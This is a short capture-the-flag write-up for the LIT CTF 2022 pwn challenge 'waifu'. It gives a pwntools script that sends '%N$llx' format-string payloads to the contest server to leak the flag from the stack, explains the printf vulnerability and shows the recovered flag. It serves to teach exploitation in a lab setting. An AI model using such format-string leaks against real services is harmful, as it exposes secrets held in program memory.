# LIT CTF 2022 – waifu

* **Category:** pwn
* **Points:** 500

## Challenge

> Honestly I just needed a name, I am almost out of time :skull:. 

## Solution

```python
from pwn import *
elf = context.binary = ELF('./waifu',checksec=False)
#p = process()
flag = []
for i in range(6,11):
	p = remote('litctf.live',31791)
	log.info(p.clean())
	p.sendline('%{}$llx'.format(i).encode())
	p.recvuntil(b"say:\n")
	leaked_flag = p.recvline()[:-1]
	decoded = unhex(leaked_flag.strip().decode())
	flag.append((decoded[::-1]).decode('utf-8'))
print(f"FLAG: {''.join(flag)}")
```
![image](https://user-images.githubusercontent.com/78451563/180676611-ba63cfb4-a119-4a54-9519-99ebd29467b7.png)

In main function we see that `flag.txt` is being stored in the stack and we're given control of printf leading to a `printf string vulnerability` to occur.
```
LITCTF{fr0m_t3xt4r7.sh_uwaaaaaaaaaaaaaa}
```
